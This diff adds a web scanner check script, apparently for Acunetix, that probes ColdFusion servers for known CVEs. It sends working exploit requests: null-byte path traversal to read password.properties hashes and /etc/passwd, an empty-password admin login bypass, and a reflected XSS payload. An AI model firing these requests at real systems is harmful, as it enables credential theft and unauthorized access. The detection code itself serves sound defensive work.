@@ -1,0 +1,282 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************							 
+function alert(fname, lastJob, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	addHTTPJobToCrawler(lastJob, 1, 1);
+	
+	AddReportItem(ri);	
+}
+// **************************************************************************************							 
+function request(verb, uri, postData)
+{	
+	lastJob = new THTTPJob();
+	lastJob.verb = verb;
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri;		
+	lastJob.addCookies = false;
+	
+	if (postData) {
+		lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+		lastJob.request.body = postData;
+	}
+	
+	lastJob.execute();
+	return (!lastJob.wasError); 
+}
+// **************************************************************************************	
+function DetermineColdFusionVersion(dir)
+{
+	if (request("GET", dir +  "adminapi/base.cfc?wsdl", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf('<!--WSDL created by ColdFusion version') != -1)) 
+	{
+		var m = /<!--WSDL created by ColdFusion version ([\d,]+)-->/.exec(lastJob.response.body);
+		if (m && m[1]) {
+			KBase("ColdFusion version", "ColdFusion version: [dark][bold]" + m[1] + "[/bold][/dark].[break] The information was extracted from " + dir +  "adminapi/base.cfc?wsdl" + '.');
+			
+			if (/^(9,0,[012]|10,0,0)/.exec(m[1])) {
+				alert('ColdFusion_apsb1303.xml', lastJob);
+			}			
+		}
+	}
+}
+// **************************************************************************************	
+function CheckForAdministratorPublic(dir)
+{
+	var found = false;
+	if (request("GET", dir +  "administrator/", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf('<title>ColdFusion Administrator Login</title>') != -1)) 
+	{
+		alert('ColdFusion_Administrator_Public.xml', lastJob);	
+		found = true;
+	}
+	
+	if (!found)
+	{
+		if (request("GET", dir + "administrator/index.cfm", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf('<title>ColdFusion Administrator Login</title>') != -1)) 
+		{
+			alert('ColdFusion_Administrator_Public.xml', lastJob);	
+			found = true;
+		}		
+	}
+}	
+// **************************************************************************************	
+function CheckForCFPathTraversal(dir)
+{
+	var found = false;
+	var matchText = '<!--  To use the xml custom menu extension simply copy and modify the following example <menu> block.  Treat menuitem as you would an anchor';
+	
+	if (request("GET", dir +  "administrator/logging/settings.cfm?locale=../../../../custommenu.xml%00en", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf(matchText) != -1)) 
+	{
+		alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+		found = true;
+	}
+	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/settings/mappings.cfm?locale=../../../../custommenu.xml%00en", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf(matchText) != -1)) 
+		{
+			alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+			found = true;
+		}
+	}	
+	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/enter.cfm?locale=../../../../custommenu.xml%00en", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf(matchText) != -1)) 
+		{
+			alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+			found = true;
+		}		
+	}	
+	
+	var regex = /(password=[0-9A-F]{40})/;
+	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en", "") && (lastJob.responseStatus == 200)) 
+		{
+			m = regex.exec(lastJob.response.body);
+	    	if (m && m[1]) {
+	    		matchText = m[1];
+				alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+				found = true;
+			}
+		}		
+	}	
+	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en", "") && (lastJob.responseStatus == 200)) 
+		{
+			m = regex.exec(lastJob.response.body);
+	    	if (m && m[1]) {
+	    		matchText = m[1];
+				alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+				found = true;
+			}
+		}		
+	}	
+	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en", "") && (lastJob.responseStatus == 200)) 
+		{
+			m = regex.exec(lastJob.response.body);
+	    	if (m && m[1]) {
+	    		matchText = m[1];
+				alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+				found = true;
+			}
+		}		
+	}	
+	if (!found)
+	{
+		if (request("GET", dir +  "administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en", "") && (lastJob.responseStatus == 200)) 
+		{
+			m = regex.exec(lastJob.response.body);
+	    	if (m && m[1]) {
+	    		matchText = m[1];
+				alert('ColdFusion_Directory_Traversal_CVE-2010-2861.xml', lastJob, matchText);	
+				found = true;
+			}
+		}		
+	}		
+}	
+// **************************************************************************************	
+function CheckCFXSSOld(dir)
+{
+	var matchText = '><script>alert(1)</script>"';
+	
+	if (request("GET", dir +  "/wizards/common/_logintowizard.cfm?>'\"><script>alert(1)</script>", "") && (lastJob.responseStatus == 200) && (lastJob.response.body.indexOf(matchText) != -1)) 
+	{
+		alert('ColdFusion_XSS_CVE-2009-1872.xml', lastJob, matchText);	
+	}
+}
+// **************************************************************************************	
+function CheckAdministrativeLoginBypass(dir)
+{
+	var matchText = "<boolean value='true'/>";
+	
+	if (request("POST", dir +  "/adminapi/administrator.cfc", "method=login&adminpassword=&rdsPasswordAllowed=1"))  
+	{
+		if (lastJob.response.body.indexOf(matchText) != -1)
+			alert('ColdFusion_CVE-2013-0632.xml', lastJob, matchText);	
+	}
+}
+// **************************************************************************************	
+function CheckColdFusion9DirTraversal(dir)
+{
+	var regex = /((\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3})/;
+	
+	if (request("GET", dir +  "/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../etc/passwd", ""))  
+	{
+		m = regex.exec(lastJob.response.body);
+	    if (m && m[1]) {
+			alert('ColdFusion_9_APSA13-03.xml', lastJob, m[1]);	
+		}
+	}
+}
+// **************************************************************************************							 
+function testCFIDE(verb, uri, postData)
+{	
+	lastJob = new THTTPJob();
+	lastJob.verb = verb;
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri;	
+	lastJob.addCookies = false;	
+	
+	if (postData) 
+		lastJob.request.body = postData;
+	
+	lastJob.execute();
+	return (!lastJob.wasError && (lastJob.responseStatus == 301 || lastJob.responseStatus == 302)); 
+}
+// **************************************************************************************	
+function DetectCFIDEDir()
+{
+	var result = "";
+	if (testCFIDE("GET", "/CFIDE", "")) 
+	{
+		result = "/CFIDE/";
+		return result;
+	}	
+	else		
+	if (testCFIDE("GET", "/www/CFIDE", "")) 
+	{
+		result = "/www/CFIDE/";
+		return result;
+	}
+	else
+	if (testCFIDE("GET", "/htdocs/CFIDE", "")) 
+	{
+		result = "/htdocs/CFIDE/";
+		return result;
+	}		
+}
+// **************************************************************************************	
+function ColdFusionIsDetected()
+{
+	// detection method 1 (not found page and look for error)
+	lastJob = new THTTPJob();
+	
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;		
+	lastJob.uri  = "/" + randStr(10) + ".cfm";;	
+	lastJob.addCookies = false;
+	
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.notFound && lastJob.response.body.indexOf('<title>Error Occurred While Processing Request</title>') != -1)
+	{
+		return true;
+	}	
+	
+	// detection method 2 (look for Administrator login page)
+	lastJob = new THTTPJob();
+	
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;		
+	lastJob.addCookies = false;
+	lastJob.uri  = "/CFIDE/administrator/index.cfm";	
+	
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.response.body.indexOf('<title>ColdFusion Administrator Login</title>') != -1)
+	{
+		return true;
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+/* main entry point */
+if (ColdFusionIsDetected())
+{
+	var dir = DetectCFIDEDir();
+	if (dir) 
+	{
+		DetermineColdFusionVersion(dir);		
+		CheckForAdministratorPublic(dir);
+		CheckForCFPathTraversal(dir);
+		CheckCFXSSOld(dir);
+		CheckAdministrativeLoginBypass(dir);
+		CheckColdFusion9DirTraversal(dir);
+		
+		// add a list of common coldfusion urls for testing
+		var root = getSiteRoot(0);
+		addLinkToCrawler(dir + "administrator/enter.cfm?locale=a", root);
+		addLinkToCrawler(dir + "adminapi/administrator.cfc?method=login", root);
+		addLinkToCrawler(dir + "adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=z&filename=a", root);
+		addLinkToCrawler(dir + "wizards/common/_logintowizard.cfm?id=1", root);		
+		addLinkToCrawler(dir + "administrator/logviewer/searchlog.cfm?viewShort=0&sortBy=&filter=CurrentFilter&startRow=z", root);
+		addLinkToCrawler(dir + "/componentutils/", root);
+		addLinkToCrawler(dir + "adminapi/base.cfc?wsdl", root);
+		
+	}
+}
